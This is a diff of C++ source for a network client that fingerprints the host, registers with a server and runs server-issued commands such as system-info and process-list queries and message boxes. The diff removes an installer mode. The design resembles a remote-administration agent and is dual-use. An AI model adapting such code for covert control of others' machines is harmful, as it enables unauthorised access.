@@ -9,8 +9,7 @@
 #include "logger.h"
 
 Client::Client()
-    : m_mode(ClientMode::Client)
-    , m_running(false)
+    : m_running(false)
     , m_shouldReconnect(true)
     , m_heartbeatThread(nullptr)
     , m_messageThread(nullptr)
@@ -26,11 +25,8 @@ Client::~Client() {
     }
 }
 
-bool Client::Initialize(ClientMode mode) {
-    m_mode = mode;
-    m_clientType = (mode == ClientMode::Installer) ? CLIENT_TYPE_INSTALLER : CLIENT_TYPE_CLIENT;
-
-    LOG_INFO("Initializing client in %s mode", m_clientType.c_str());
+bool Client::Initialize() {
+    LOG_INFO("Initializing client");
 
     // Generate hardware ID
     m_hardwareId = Fingerprint::GetHardwareId();
@@ -56,13 +52,13 @@ bool Client::Connect() {
     // Send registration
     std::string systemInfo = SystemInfo::GetSystemInfoJson();
 
-    if (!m_protocol.SendRegister(m_clientType.c_str(), m_hardwareId.c_str(), systemInfo.c_str())) {
+    if (!m_protocol.SendRegister(CLIENT_TYPE_CLIENT, m_hardwareId.c_str(), systemInfo.c_str())) {
         LOG_ERROR("Failed to send registration");
         m_protocol.Disconnect();
         return false;
     }
 
-    LOG_INFO("Registered as %s", m_clientType.c_str());
+    LOG_INFO("Registered as CLIENT");
     m_lastHeartbeat = GetTickCount();
 
     return true;
@@ -157,7 +153,6 @@ void Client::HandleServerMessage(const ServerMessage& msg) {
     LOG_DEBUG("Received message type: %s", msg.type.c_str());
 
     if (msg.type == "accepted" || msg.type == "ack") {
-        // Server acknowledged our message
         LOG_DEBUG("Server acknowledged message");
         return;
     }
@@ -168,12 +163,10 @@ void Client::HandleServerMessage(const ServerMessage& msg) {
     }
 
     if (msg.type == "command") {
-        // Parse command type - could be string or int
+        // Parse command type
         CommandType cmdType = CommandType::None;
 
-        // Try to parse commandType as string first
         if (!msg.commandType.empty()) {
-            // Map string command types to enum
             if (msg.commandType == "ping" || msg.commandType == "1") cmdType = CommandType::Ping;
             else if (msg.commandType == "systeminfo" || msg.commandType == "2") cmdType = CommandType::GetSystemInfo;
             else if (msg.commandType == "processlist" || msg.commandType == "3") cmdType = CommandType::GetProcessList;
@@ -192,7 +185,6 @@ void Client::HandleServerMessage(const ServerMessage& msg) {
             else if (msg.commandType == "messagebox" || msg.commandType == "16") cmdType = CommandType::MessageBox;
             else if (msg.commandType == "update_available" || msg.commandType == "17") cmdType = CommandType::UpdateAvailable;
             else {
-                // Try to parse as integer
                 int cmdInt = atoi(msg.commandType.c_str());
                 if (cmdInt > 0) {
                     cmdType = static_cast<CommandType>(cmdInt);
@@ -217,10 +209,10 @@ void Client::HandleServerMessage(const ServerMessage& msg) {
         // Send response
         m_protocol.SendCommandResponse(msg.commandId.c_str(), result.success, result.result.c_str());
 
-        // Check if we should exit (e.g., after successful auto-install in INSTALLER mode)
+        // Check if we should exit (e.g., after uninstall or update)
         if (result.shouldExit) {
             LOG_INFO("Command requested exit, stopping client...");
-            Sleep(500);  // Give time for response to be sent
+            Sleep(500);
             ExitProcess(0);
         }
     }
